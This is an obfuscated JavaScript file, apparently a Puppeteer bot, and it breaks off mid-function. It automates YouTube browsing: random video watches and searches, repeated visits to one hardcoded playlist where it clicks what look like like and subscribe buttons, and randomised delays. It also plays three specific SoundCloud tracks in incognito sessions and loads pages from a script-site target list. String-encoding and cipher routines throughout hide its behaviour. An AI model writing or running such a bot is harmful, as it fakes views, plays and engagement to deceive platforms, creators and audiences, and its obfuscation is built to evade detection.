const W = d,
  V = c,
  U = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x2435 + -0x296 * 0x2 + -0x1f08))) + i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x9 * 0x2f + 0xe * -0x1c2 + 0x1 * 0x1a43);
    let h = e[f];
    if (c['qOIDMe'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1636 + 0x11b7 + -0x27ed * 0x1, r, s, t = -0x3 * 0x997 + -0x3 * -0x7e5 + 0x516; s = m['charAt'](t++); ~s && (r = q % (0x1757 + -0x1aa2 + -0xb * -0x4d) ? r * (0x6a * 0x11 + -0x9 * -0xab + -0xccd) + s : s, q++ % (-0x70e + -0x2 * 0x6a2 + -0x1456 * -0x1)) ? o += String['fromCharCode'](0x1cc1 + -0x78 * 0x50 + 0x9be & r >> (-(0x1a90 + 0x80d + -0x229b) * q & 0x2337 + 0x134 + -0xb * 0x34f)) : 0x171 * -0x9 + -0x1c68 + 0x63 * 0x6b) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1e4f * 0x1 + -0x6 * -0x4d5 + -0x1 * -0x151, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x7 * 0x9d + -0x2549 + 0x210e * 0x1))['slice'](-(0x267d + 0xe5 + 0x10 * -0x276));
        }
        return decodeURIComponent(p);
      };
      c['EmsyLy'] = i, b = arguments, c['qOIDMe'] = !![];
    }
    const j = e[0x2 * -0x49d + 0xee9 + -0x5af],
      k = f + j,
      l = b[k];
    return !l ? (h = c['EmsyLy'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1649 + 0x3 * 0x405 + 0x9a * 0x11), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x9 * 0x2f + 0xe * -0x1c2 + 0x1 * 0x1a43);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x50a0 + -0x3238 + 0x56c8 + (-0x2126 + -0x12d * -0x1 + -0x5a91 * -0x1) * random()) : await standardWaitForNetIdle(f), await wait(-0x150e + 0x959 + 0x1 * 0x1f3d + (-0x2730 + 0x1 * -0x29a2 + 0x77e2) * random()), -0x140d + 0x21d8 + -0xdca;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x1ce9 + 0x47 * 0x6a + -0x26c7), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1cfe + -0x3c * -0xa3 + -0x1 * 0x4331;
}
async function randomWait() {
  return await wait(0x7 * 0x9d + -0x2549 + 0x8c1 * 0x6 + (0x267d + 0xe5 + 0x7 * -0x2d6) * random()), 0x2 * -0x49d + 0xee9 + -0x5ae;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1 * 0x1c44 + -0x6d * 0x4 + -0x1a90, 0x1c * -0xf2 + -0x59c + 0x1 * 0x201b), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x3359 * -0x8 + -0x1bb7a + 0x2c83 * 0x6) * getRandomInt(0x1 * -0x235a + -0xa30 + -0xa * -0x48e, 0x19e3 + -0x2449 + 0xa6b), h)), 0x61 + 0x1cf8 + -0x1d58;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x2696 + -0xdb4 * 0x2 + 0x6 * -0x1dd;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0xb33 + 0xd * 0x123 + 0x131 * -0x3]['split']('\x20');
    for (let k = 0x1 * 0x2378 + -0xdd + -0x3 * 0xb89; k < i['length']; k += -0xfce + -0x676 * 0x4 + 0x29a8)
      j += i[k] * h[i[k + (0x2 * 0x22e + 0x3 * 0x42e + -0xad * 0x19)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const R = b,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1 * 0x20bf + -0x23fb + 0x44c0)['map'](l => Array['from'](l['children']))['flat'](0xf68 + -0x1eec + 0xf85)['map'](l => l['childNodes'][-0x1 * 0x14b7 + 0x24aa + -0xff2]['childNodes'][-0x20e9 + -0x1d4c + 0x3e35]['childNodes'][0x1b94 + 0x1 * -0x179b + 0x4 * -0xfe]['childNodes'][0x6 * 0x5bc + -0x1 * 0xe84 + -0x13e4]['childNodes'][0x411 * -0x5 + 0x29d * -0xd + 0x364f]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', R(0x13, 'xrxg') + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0xb3 * 0x16 + 0x283 * -0xe + 0x3674, -0x10c3 + -0x237d + 0x8f9 * 0x8)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x1a78 + -0x568c + 0x31 * 0x26c);
  const h = await getMaxTime(f),
    i = Math['min']((0xb10b + -0x2f9 * 0x17 + 0x7db4) * getRandomInt(0x16c0 + 0x1475 * -0x1 + -0x75 * 0x5, 0x46 * 0x68 + -0x2106 + -0x1 * -0x49b), h);
  return await wait(i), 0x1 * 0x882 + 0x1035 + -0x18b6;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1cdb + 0x14b6 + -0x1 * -0x825]['children'][0x1913 + -0xc5 * 0x2b + 0x804]['children'][0x9d9 + 0xeea + -0x3 * 0x841]['children'][-0x1 * -0x2039 + -0x878 + 0x17c1 * -0x1]['children'][0x1d + -0xa3 * -0x1d + -0x1294]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x25 * -0x10d + -0x1 * -0x221f + -0x4c3 * -0x1;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x2bf + 0x1 * 0x1dfe + -0x1adb + (0x16bf + -0x2381 + 0x4 * 0x33d) * random()
  }), await wait(0x269 + -0x10e3 * 0x2 + 0xb1b * 0x3 + (0x2 * -0xdb + 0x7 * -0x594 + 0x29ee) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xd * -0xbb + -0x209f + 0x2a20]['childNodes'][0x208f + -0x5f1 + -0x3 * 0x8df]['childNodes'][0x12ca * 0x1 + 0x1 * -0x24fe + 0x1235]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1db + -0x1 * -0x4f5 + -0x2f * 0x25]['childNodes'][0x48e * -0x1 + 0x2e8 + 0x1a6]['childNodes'][0x46 + -0x99e + 0x95a]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x981 + -0x1613 * -0x1 + -0xc91),
          r = 0x2067 + -0x23 * 0x101 + -0xaf * -0x4;
        for (let u = -0x2f * -0x61 + 0xb93 + -0x1d62; u < q['length']; u += -0x17 * -0xdb + -0x2298 + 0xeed)
          r += q[u] * k[q[u + (0x2635 * -0x1 + -0x1 * 0x1f9b + 0x45d1)]];
        return r;
      }(n);
  });
  await wait((-0x1337 + -0x1f9a + 0x2f5 * 0x25) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1 * -0x2b37 + -0xffd5 + 0x2156c) * getRandomInt(0x732 * 0x2 + 0x208c + -0x963 * 0x5, 0x14c7 + 0x2d3 + -0x1790), h + (-0xaf9 * -0x1 + 0x523 + 0x49 * 0xc));
  return await wait(i), 0x18a4 + 0xa8d + -0x2330;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0xf65 + -0x2574 + 0x34d9), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x20f5 + 0x1c0f + 0x109e + (-0x6e4 + -0x4d0 + 0xf9c) * Math['random']());
    });
  }, 0x13 * -0x1d3 + 0x12 * 0x2b1 + -0x59 * -0x27);
  await wait(0x2e * -0xde9 + -0x57bb1 + 0xc8f6f);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0xc35d * -0x1 + -0x617f + 0x8882) * getRandomInt(0xf27 + -0xec1 + -0x62, -0x5fc + 0x6 * 0x2c9 + -0x1 * 0xaa1)), clearInterval(h), -0x94 * -0x2b + 0x8d4 + 0x1 * -0x21af;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x9 * 0x2f + 0xe * -0x1c2 + 0x1 * 0x1a43);
    let h = e[f];
    if (b['aBUNwe'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1636 + 0x11b7 + -0x27ed * 0x1, s, t, u = -0x3 * 0x997 + -0x3 * -0x7e5 + 0x516; t = n['charAt'](u++); ~t && (s = r % (0x1757 + -0x1aa2 + -0xb * -0x4d) ? s * (0x6a * 0x11 + -0x9 * -0xab + -0xccd) + t : t, r++ % (-0x70e + -0x2 * 0x6a2 + -0x1456 * -0x1)) ? p += String['fromCharCode'](0x1cc1 + -0x78 * 0x50 + 0x9be & s >> (-(0x1a90 + 0x80d + -0x229b) * r & 0x2337 + 0x134 + -0xb * 0x34f)) : 0x171 * -0x9 + -0x1c68 + 0x63 * 0x6b) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1e4f * 0x1 + -0x6 * -0x4d5 + -0x1 * -0x151, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x7 * 0x9d + -0x2549 + 0x210e * 0x1))['slice'](-(0x267d + 0xe5 + 0x10 * -0x276));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x2 * -0x49d + 0xee9 + -0x5af,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1 * 0x1c44 + -0x6d * 0x4 + -0x1a90; u < 0x1c * -0xf2 + -0x59c + 0x1 * 0x2114; u++) {
          p[u] = u;
        }
        for (u = -0x111e * -0x2 + -0x24f5 + 0x2b9 * 0x1; u < 0x1 * -0x235a + -0xa30 + -0x7 * -0x6a6; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x19e3 + -0x2449 + 0xb66), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x61 + 0x1cf8 + -0x1d59, q = 0x2696 + -0xdb4 * 0x2 + 0x6 * -0x1dd;
        for (let v = -0xb33 + 0xd * 0x123 + 0x1ca * -0x2; v < n['length']; v++) {
          u = (u + (0x1 * 0x2378 + -0xdd + -0x2b * 0xce)) % (-0xfce + -0x676 * 0x4 + 0x2aa6), q = (q + p[u]) % (0x2 * 0x22e + 0x3 * 0x42e + -0x6e * 0x25), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * 0x20bf + -0x23fb + 0x45ba)]);
        }
        return t;
      };
      b['zMrOFX'] = m, c = arguments, b['aBUNwe'] = !![];
    }
    const j = e[0xf68 + -0x1eec + 0xf84],
      k = f + j,
      l = c[k];
    return !l ? (b['fWnrSk'] === undefined && (b['fWnrSk'] = !![]), h = b['zMrOFX'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x2198 + 0x5 * 0x5e9 + 0x40b;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1875 + 0x56 * 0xe + 0x13c2;
    await randomWait();
  }
  return -0x5c4 + 0x10f * -0xf + 0x15a6;
}

function fetchRandomSC() {
  return Math['random']() <= -0x23 * -0xa7 + 0x185 * -0x12 + 0x485 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x20c * -0x4 + -0x1c9a + -0x6 * -0x367 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const S = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x2 * -0xa06 + -0x736 + 0x66b * -0x2 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x8bd + 0x1 * 0x4d5 + 0x3e8;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x2 * -0xa6bb + -0x30b4 + -0x20d2 * -0x11 + getRandomInt(-0x30f0 + 0x73 * -0xe9 + -0xd433 * -0x1, 0x12eb * 0x5 + 0x42 * -0x23d + -0x1 * -0xaa53));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0xd1 * 0x1 + -0x2678 + 0x25a8), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x211 * 0x1 + 0x134b + -0x113a;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + S(0x0) + 'ment.inner' + 'HTML');
      return log(v['slice'](0x55 * 0x6a + -0x1768 + -0xbca, -0x207 * 0x3 + -0x10a9 * 0x1 + 0x16f0)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0xd57 * -0x2 + -0xe5d + 0x481 * -0x1 + floor((-0x990 + 0x9 * 0x3c7 + -0x1487) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xabf522d0 + -0x419e3178 + 0x10f * 0x1595738),
          -0x3 * -0x299e4e + 0xdb7966 + -0x50 * 0x2b441,
          0x909e * 0x1 + 0x3 * 0xa83 + 0x7 * -0x6e1,
          -0x13eb + -0x1928 + 0x1 * 0x2d93
        ], y = [
          0x9f * -0x3 + 0x7e9 + -0x2fa * 0x2,
          -0x1fa0 + -0x141 + -0x20f1 * -0x1,
          -0x2011 + -0x166d + 0x3e5 * 0xe,
          -0x15d * -0x13 + -0x80e * 0x2 + -0x9cb
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1812 + -0x1cf7 + 0x39 * 0x16)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0xa5f + -0x378 + 0xdd7; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1 * -0x14d1 + 0x1 * -0x201 + 0x16d2) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x31b * -0xb + 0x1e87 + -0x1f * -0x1e] = A[-0x2 * 0xdcb + -0x1215 + 0x2dbb] = A[0x27 * -0xc1 + -0x7 * -0x31c + -0x3 * -0x28c] = A[0xa20 + -0x2703 + 0x1ce5] = A[0x26c3 + -0x1 * 0xcdb + -0x3b3 * 0x7] = A[-0x5d0 + 0x2495 + 0x1ec1 * -0x1] = A[-0x5e * -0x49 + -0x1d * -0x52 + -0x2413 * 0x1] = A[0x1b05 + -0x8b8 + -0x1247] = A[0x1 * 0x106c + 0x60 * 0x7 + 0x657 * -0x3] = A[-0x53 * -0x33 + -0x1 * -0x3c8 + -0x1449] = A[-0x1c0f + -0xd * 0x1cf + -0xb * -0x4b1] = A[-0x270e + 0x2294 + 0x484] = A[0x1 * 0x5 + -0x766 + 0x76c] = A[-0x24ee + -0x8 * 0x32d + 0x2 * 0x1f31] = A[-0xee + 0x1e38 + 0x1d3d * -0x1] = A[-0xaa * 0x26 + 0x17b9 * -0x1 + 0x3103 * 0x1] = A[-0x1 * -0x14e9 + 0x3 * 0xc17 + -0x391f] = -0x1 * -0x281 + -0x2413 + -0x1 * -0x2192, this['blocks'] = A) : this['blocks'] = [
                -0x218d + -0x12fc + 0x3489,
                0x5 * 0x257 + 0x1dce + -0x2981,
                0x18a6 + 0x2076 + -0x391c,
                0x16ba + -0x1688 + -0x32,
                0x241e + 0x1 * 0x2281 + -0x469f,
                0x4e9 + 0x2 * -0x329 + 0x169,
                0x85 * -0x5 + 0xca * -0x1 + 0x363,
                0x18ab + -0x201f + -0xd4 * -0x9,
                -0x2578 + -0x1a17 + -0x35 * -0x133,
                0x403 + -0x91c + 0x519,
                0x935 * -0x1 + -0x1c23 + 0x3bc * 0xa,
                0x649 * -0x1 + 0xeb2 + -0x869,
                -0x82 * 0x49 + -0x1b21 + 0x4033,
                0x207c + 0x2 * -0x1178 + 0x274,
                -0x888 + -0x1e23 + 0x209 * 0x13,
                0x1 * 0x615 + 0xab1 + 0x1 * -0x10c6,
                0xc * -0x319 + 0x17b * 0xf + 0xef7
              ], this['h0'] = -0xc283542 + -0x82 * 0x10dfb5d + -0x1 * -0xfc86fd7d, this['h1'] = -0x1 * 0x115962ad9 + -0x17319580b + 0x3787d2e6d, this['h2'] = -0x1c47689 * -0x9d + -0xd81a7c29 + 0x5b58a722, this['h3'] = -0x19430b59 * -0x1 + -0x4599158 + -0x4b7258b, this['h4'] = -0x15b81a145 + -0x1 * -0x102b041a0 + 0x11ca44195, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x26e5 + 0x21a6 + -0x488b, this['finalized'] = this['hashed'] = 0x1 * 0x1a13 + 0x4 * 0x613 + -0x325f * 0x1, this['first'] = 0xd08 * 0x1 + 0x1156 + -0x1e5d;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0xb5d + -0x5 * -0x69d + 0x3 * -0x73c, O = J['length'] || 0x3d9 * -0xa + -0x1dc4 + -0x221f * -0x2, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1 * 0x1525 + 0x1 * -0xef2 + -0x633, P[-0x8af + 0x8 * 0x3e9 + -0x1699] = this['block'], P[-0x1dbe + 0x4 * -0x8e9 + -0x2 * -0x20b9] = P[-0x2 * 0x1237 + -0x2461 + 0x48d0] = P[-0x393 + -0x161 * -0x1 + 0x234] = P[-0x11 * 0x45 + -0x1 * -0x1f7f + -0x1ae7] = P[0x1f2b + 0x212e + -0x4055 * 0x1] = P[0x2225 * -0x1 + -0x3ce * -0x2 + 0xce * 0x21] = P[0x355 * 0x3 + 0x1b9a + -0x1 * 0x2593] = P[0x26a6 + -0xc * 0x2a1 + 0x1 * -0x713] = P[-0x65 + 0x1195 + 0x12 * -0xf4] = P[-0x17c0 + -0x1cde + 0x1 * 0x34a7] = P[-0xe19 + 0x25 * 0x17 + 0xad0] = P[0x21fd + 0x22dd + -0x41 * 0x10f] = P[0x3d9 + -0x20f6 * 0x1 + 0x1d29] = P[0xce * -0x20 + 0x11 * 0x244 + -0xcb7] = P[0xa36 * 0x3 + -0x47f * 0x7 + 0xe5] = P[0x590 + -0xb53 + 0x5d2] = 0x66e * 0x5 + -0x2204 + 0x1de), K) {
                    for (N = this['start']; M < O && N < -0x7 * 0x2b6 + -0x23ec + 0xb5 * 0x4e; ++M)
                      P[N >> 0x2281 + -0x4 * 0x449 + -0x115b] |= J[M] << y[0xf43 + 0x11e9 + -0x2129 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x427 * 0x7 + 0x6b6 * 0x4 + 0x3 * 0xd3; ++M)
                      (L = J['charCodeAt'](M)) < 0x162d + 0x1c5e + 0x17 * -0x22d ? P[N >> 0x1 * 0x63 + -0x1888 + 0x1827] |= L << y[-0x8b3 + -0xa9 * 0x7 + 0xd55 & N++] : L < -0xb39 * -0x1 + -0xcb * -0x23 + 0x3d * -0x82 ? (P[N >> -0x20 * 0x5e + -0x2686 + -0x3248 * -0x1] |= (-0xfda + 0xe * -0x29a + -0x269 * -0x16 | L >> 0x5 * -0x19 + 0x26b8 + 0x1 * -0x2635) << y[-0xb56 + 0x6c2 + -0x2f * -0x19 & N++], P[N >> 0x1252 * -0x1 + -0xfd1 * -0x1 + 0x1 * 0x283] |= (0x2 * -0x56c + -0x1 * 0x1e22 + 0x297a | -0x3f * -0x65 + 0x27 * 0xe9 + -0x3c1b & L) << y[0x23a5 + 0x36 * -0x77 + 0x544 * -0x2 & N++]) : L < 0x10a5c + -0x5d61 + 0x2b05 || L >= 0x1d81 * 0xe + -0x1007 + 0x3 * -0x39ad ? (P[N >> -0x5 * 0x4eb + -0x2f * 0x40 + -0x745 * -0x5] |= (-0x5ae + 0x1 * 0x1c1b + -0x158d | L >> -0x21ea + -0x166c + 0x3862 * 0x1) << y[-0x4 * -0x673 + 0xd42 + 0x5 * -0x7cf & N++], P[N >> -0xa1d + -0x7ca + 0x11e9] |= (-0x1497 + 0xb * 0xef + 0xad2 | L >> -0x1 * 0x3ad + 0x5d5 * 0x1 + -0x4e * 0x7 & -0x1d86 + -0x170 * 0x5 + 0x24f5 * 0x1) << y[0x1d * -0x129 + -0x157 * 0x16 + 0x3f22 & N++], P[N >> -0x2422 + -0x1030 + 0xc5 * 0x44] |= (-0x1fb3 + 0xd29 + -0x1 * -0x130a | -0x2 * 0xfc1 + 0x39c * -0x6 + 0x3569 & L) << y[0x76c + -0x322 + -0x447 & N++]) : (L = -0x1923e + 0x14 * 0x1ad + 0x3 * 0xd03e + ((0x1 * -0xabd + -0xcd * 0x14 + 0x1ec0 & L) << -0x2 * -0x12e3 + 0x535 * -0x1 + -0x2087 | 0xa1 + -0x1652 + 0x448 * 0x6 & J['charCodeAt'](++M)), P[N >> -0x1717 + -0x23d + 0x1956] |= (0x229e + -0x9b7 + -0xf * 0x199 | L >> 0xfee + 0x9be + -0x199a) << y[0xf15 + -0x892 + -0x680 & N++], P[N >> 0x4 * 0x265 + 0x7 * 0x18d + -0x3 * 0x6cf] |= (0xa * -0x1df + -0x143 + 0x1479 | L >> 0x5a * 0x2a + -0x21b0 * -0x1 + 0x1834 * -0x2 & 0x2bd * -0x3 + -0x79 * -0x36 + 0xd * -0x150) << y[-0x1d0 * -0x6 + -0x2 * -0xef9 + -0x28cf & N++], P[N >> -0xa * -0x223 + -0x1ca4 + 0x748] |= (-0x15ad + 0x1778 + -0x14b | L >> 0xd * 0x30 + 0x2 * -0x90e + 0xfb2 & -0x68 + -0x1bd9 + 0x1c80 * 0x1) << y[-0x1458 + -0x469 * 0x7 + 0x333a & N++], P[N >> 0x1 * 0x229d + 0x13 * 0xbe + -0x30b5] |= (0x12cf * 0x2 + 0x1f10 + -0x442e | -0x694 + -0x17e0 + 0x1eb3 & L) << y[0x96c * -0x2 + 0xb6a * 0x1 + 0x771 & N++]);
                  }
